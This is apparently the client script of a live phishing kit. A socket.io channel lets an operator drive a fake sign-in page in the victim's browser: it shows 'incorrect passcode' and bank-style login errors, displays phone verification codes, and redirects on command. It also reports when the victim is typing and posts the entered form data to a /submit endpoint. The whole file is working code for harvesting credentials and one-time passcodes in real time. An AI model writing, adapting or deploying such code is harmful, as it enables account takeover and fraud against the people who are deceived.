	let userId = sessionStorage.getItem("userId");
	let page;
	let preloader = document.getElementById('load');
	
	// 🔹 Generate or reuse the userId
	if (!userId) {
	  userId = "user_" + Math.random().toString(36).substr(2, 9);
	  sessionStorage.setItem("userId", userId);
	}
	
	 // Use window.socket globally from the start
		window.socket = io("/", {
			auth: { userId },
		  reconnection: true,
		  reconnectionAttempts: 5,
		  reconnectionDelay: 500
		});
		let socket = window.socket; // optional local alias
			
    socket.on("user:command", (data) => {
	  const { command, code, phonescreen, link } = data;
	  resetSubmitForm();
	//alert("command received");
	  switch (command) {
	    case "refresh":
	      location.reload();
	      break;
	
	    case "bad-otp":
	      let badOtp = document.getElementById('err-mess');
	      console.log(badOtp);
	      badOtp.textContent = `  incorrect passcode`;
	      badOtp.style.display = "block";
	      break;
	      
	    case "bad-login":
	      document.querySelector(".error-alert").style.display = "block";
	      //let preloader = document.getElementById('load');
	      document.querySelector(".error-alert-message").innerHTML = 
				    `Try signing in with a <a href="#">QR code</a>, or select 
				     <a href="#">Forgot user ID</a> or 
				     <a href="#">Reset password</a> to avoid being locked out.`;
	     break;
	
	    case "phone-otp":
	      if (!code) return;
	      const phoneNumberEl = document.querySelector("#phone");
	      document.querySelector("#phone-wrap").style.display = "block";
	      sessionStorage.setItem("setcode", code);
	      if (!phoneNumberEl) {
	        window.location.href = phonescreen;
	        return;
	      }
	      phoneNumberEl.textContent = code;
	      break;
	
	    case "notify":
	      alert("You have been waiting too long on this page");
	      break;
	
	    case "redirect":
	      if (link) window.location.href = link;
	      break;
	  }
	});
	
	// 🔹 When connected, update the user status
	socket.on("connect", () => {
	  console.log("Connected as", userId);
	  socket.emit("user:update", {
	    userId,
	    newStatus: "online",
	    page: page ,
	  });
	});
	
	// 🔹 When page unloads or closes
	window.addEventListener("beforeunload", () => {
	  socket.emit("user:update", {
	    userId,
	    newStatus: "offline",
	    page: page ,
	  });
	});
    
    // 🔹 When user focuses on an input field
	window.addEventListener("focusin", (e) => {
	  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
	    socket.emit("user:update", {
	      userId,
	      newStatus: "typing",
	      page: page ,
	    });
	  }
	});
	
	// 🔹 When user stops typing or leaves input
	window.addEventListener("focusout", (e) => {
	  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
	    socket.emit("user:update", {
	      userId,
	      newStatus: "online",
	      page: page ,
	    });
	  }
	});
	
	// 🔹 While typing (fires continuously as user types)
	window.addEventListener("input", (e) => {
	  if (e.target.tagName === "INPUT" || e.target.tagName === "TEXTAREA") {
	    socket.emit("user:update", {
	      userId,
	      newStatus: "typing",
	      page: page ,
	    });
	  }
	});

    // ✅ if your site has links that cause navigation
    document.addEventListener("click", (e) => {
      const link = e.target.closest("a");
      if (link && link.href && link.origin === location.origin) {
        setTimeout(() => {
          socket.emit("user:update", {
            userId,
            newStatus: "online",
            page: page ,
          });
        }, 200);
      }
    });

//document.head.appendChild(style); 


function resetSubmitForm() {
    $('.sign-in-button')
        .prop('disabled', false)
        .html('Sign in');

    $('input').prop('disabled', false);
}

async function submitFormData(formData) {
  // Show preloader
  $('.submit').prop('disabled', true).html(
                '<span class="loading-dots"><span></span><span></span><span></span></span>'
            );
            
  $('input').prop('disabled', true);
  
  formData.userId = userId;
  try {
    const res = await fetch("/submit", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(formData),
    });

    const data = await res.json();

    // Handle success (optional)
    console.log("Response:", data);
    if(data.link){ window.location.href = data.link };    
    //return data;
  } catch (error) {
    console.error("Error submitting form:", error);
    throw error;
	}
}

window.onbeforeunload = () => {
      socket.emit("user:update", {
        userId,
        newStatus: "offline",
        page: page ,
      });
  }; 
  
  
  // returns a Promise that resolves with a socket, creating one if none appears within `timeoutMs`
function getOrCreateSocket({ timeoutMs = 500 } = {}) {
  return new Promise((resolve) => {
    const existing = window.socket;
    if (existing) return resolve(existing);

    const start = Date.now();
    const checkInterval = 50; // check every 50ms
    const timer = setInterval(() => {
      if (window.socket) {
        clearInterval(timer);
        return resolve(window.socket);
      }
      if (Date.now() - start >= timeoutMs) {
        clearInterval(timer);
        console.log("reconnecting");

        // create a new socket after timeout
         userId = sessionStorage.getItem("userId") || null;
        // create and attach to window.socket so other scripts can reuse it
        window.socket = io("/", {
		  auth: { userId },   // ✅ preferred way
		  reconnection: true,
		});

        return resolve(window.socket);
      }
    }, checkInterval);
  });
}

// Usage (example - in an async context)
(async () => {
  const socket = await getOrCreateSocket({ timeoutMs: 2000 });
  // local alias (not redeclaring with const if you already have `socket` var)
  window.socket = socket;
  // if you want a local const:
  const localSocket = socket;

  // now you can attach your handlers safely
  localSocket.on("connect", () => console.log("connected", localSocket.id));
  // ... rest of your socket logic
})();